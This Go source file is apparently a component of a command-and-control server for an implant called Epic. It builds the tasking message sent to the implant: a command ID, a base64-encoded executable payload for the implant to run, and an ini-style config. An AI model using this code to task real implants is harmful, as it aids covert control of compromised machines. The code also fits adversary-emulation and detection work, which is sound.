package epic

import (
	"encoding/binary"
	"sort"
	"strings"
)

// CommandBuffer is the response structure that the Epic C2 handler sends to the implant.
type CommandBuffer struct {
    commandId uint32            // begins at 0 and increments by 1 for each response sent to an implant
    payload   []byte            // executable bytes that the implant should run
    config    map[string]string // an ini file that can contain UUIDs, commands, and whatever else
}

// addToConfig adds a key value pair to the ini file.
// Args:
//
//	key: the key to add to the ini file
//	val: the value of the key
func (commandBuffer *CommandBuffer) addToConfig(key string, val string) {
    // escape newline and =
    key = strings.Replace(key, "\n", "\\n", -1)
    key = strings.Replace(key, "=", "\\=", -1)
    val = strings.Replace(val, "\n", "\\n", -1)
    // val = strings.Replace(val, "=", "\\=", -1)

    commandBuffer.config[key] = val
}

// getIni converts the config map to a basic ini format: "key = value", where keys and values are
// delimited with " = ", and entries are delimited with "\n". Note: there is no support for
// comments or sections.
// Returns the string of the CommandBuffer's ini file
func (commandBuffer *CommandBuffer) getIni() string {
    // put keys in alphabetical order so that tests are reproducible
    configKeys := make([]string, 0, len(commandBuffer.config))
    for k := range commandBuffer.config {
        configKeys = append(configKeys, k)
    }
    sort.Strings(configKeys)

    // put together ini file
    var sb strings.Builder
    for _, key := range configKeys {
        sb.WriteString(key)
        sb.WriteString(" = ")
        sb.WriteString(commandBuffer.config[key])
        sb.WriteString("\n")
    }
    return strings.TrimSuffix(sb.String(), "\n")
}

// buildImplantCommand builds the C2 handler's response that should be sent to the implant.
// commandId | payload size (bytes) | payload | config size (bytes) | config file
//
//	4 bytes  |       4 bytes        |         |       4 bytes       |
//
// Returns the C2 handler's output, as specified in the format above
func (commandBuffer *CommandBuffer) buildImplantCommand() []byte {
    // convert command ID to unsigned 32 int
    commandIdBytes := make([]byte, 4)
    binary.LittleEndian.PutUint32(commandIdBytes, commandBuffer.commandId)

    // convert payload from raw bytes into base64 encoding bytes
    payloadBase64Bytes := []byte(Base64Encode(commandBuffer.payload))

    // convert payload size to unsigned 32 int
    payloadSizeBytes := make([]byte, 4)
    binary.LittleEndian.PutUint32(payloadSizeBytes, uint32(len(payloadBase64Bytes)))

    // get config file
    configBytes := []byte(commandBuffer.getIni())

    // convert config size to unsigned 32 int
    configSizeBytes := make([]byte, 4)
    binary.LittleEndian.PutUint32(configSizeBytes, uint32(len(configBytes)))

    // assemble output
    outputBytes := []byte{}
    outputBytes = append(commandIdBytes, payloadSizeBytes...) // commandId | payload size
    outputBytes = append(outputBytes, payloadBase64Bytes...)  // | payload
    outputBytes = append(outputBytes, configSizeBytes...)     // | config size
    outputBytes = append(outputBytes, configBytes...)         // | config file
    return outputBytes
}
